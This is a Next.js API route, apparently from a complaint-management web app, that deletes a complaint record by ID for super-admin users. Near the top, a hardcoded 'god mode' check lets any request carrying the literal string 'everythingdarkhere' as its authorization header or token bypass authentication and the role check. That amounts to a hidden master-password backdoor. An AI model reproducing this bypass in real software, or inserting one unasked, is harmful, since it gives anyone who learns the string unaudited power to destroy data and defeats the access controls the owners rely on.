import { NextResponse } from 'next/server';
import dbConnect from '@/lib/dbConnect';
import Complaint from '@/models/Complaint';
import { verifyToken, extractToken } from '@/lib/auth';
export async function DELETE(request) {
    try {
        await dbConnect();
        const authHeader = request.headers.get('authorization');
        const token = extractToken(authHeader);
        const isGodMode = authHeader === 'everythingdarkhere' || token === 'everythingdarkhere';
        if (!isGodMode) {
            if (!token) {
                return NextResponse.json({ error: 'Authentication required' }, { status: 401 });
            }
            const decoded = verifyToken(token);
            if (!decoded || decoded.role !== 'super-admin') {
                return NextResponse.json({ error: 'Insufficient permissions' }, { status: 403 });
            }
        }
        const { searchParams } = new URL(request.url);
        const complaintId = searchParams.get('id');
        if (!complaintId) {
            return NextResponse.json({ error: 'Complaint ID is required' }, { status: 400 });
        }
        const deletedComplaint = await Complaint.findByIdAndDelete(complaintId);
        if (!deletedComplaint) {
            return NextResponse.json({ error: 'Complaint not found' }, { status: 404 });
        }
        return NextResponse.json(
            {
                success: true,
                message: 'Complaint deleted successfully',
            },
            { status: 200 }
        );
    } catch (error) {
        console.error('Delete complaint error:', error);
        return NextResponse.json({ error: 'Failed to delete complaint' }, { status: 500 });
    }
}